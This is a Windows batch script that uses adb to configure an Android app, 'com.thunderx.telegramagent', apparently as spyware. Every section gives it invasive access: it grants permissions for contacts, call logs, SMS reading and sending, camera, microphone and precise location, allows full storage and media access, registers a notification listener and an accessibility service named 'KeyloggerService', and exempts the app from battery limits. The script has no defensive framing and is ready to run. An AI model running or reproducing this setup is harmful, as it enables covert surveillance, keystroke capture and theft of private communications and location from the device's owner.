set PKG=com.thunderx.telegramagent

REM Essential permissions
adb shell pm grant %PKG% android.permission.READ_CONTACTS
adb shell pm grant %PKG% android.permission.READ_CALL_LOG
adb shell pm grant %PKG% android.permission.READ_SMS
adb shell pm grant %PKG% android.permission.RECEIVE_SMS
adb shell pm grant %PKG% android.permission.SEND_SMS
adb shell pm grant %PKG% android.permission.READ_PHONE_STATE
adb shell pm grant %PKG% android.permission.CAMERA
adb shell pm grant %PKG% android.permission.RECORD_AUDIO
adb shell pm grant %PKG% android.permission.ACCESS_FINE_LOCATION
adb shell pm grant %PKG% android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant %PKG% android.permission.POST_NOTIFICATIONS

REM Essential AppOps
adb shell appops set %PKG% READ_CALL_LOG allow
adb shell appops set %PKG% READ_SMS allow
adb shell appops set %PKG% RECEIVE_SMS allow
adb shell appops set %PKG% MANAGE_EXTERNAL_STORAGE allow
adb shell appops set %PKG% READ_MEDIA_IMAGES allow
adb shell appops set %PKG% READ_MEDIA_VIDEO allow

REM Special services
adb shell settings put secure enabled_notification_listeners %PKG%/.NotificationListener
adb shell settings put secure enabled_accessibility_services %PKG%/.KeyloggerService

REM Battery
adb shell dumpsys deviceidle whitelist +%PKG%

REM Restart
adb shell am force-stop %PKG%
adb shell am start -n %PKG%/.MainActivity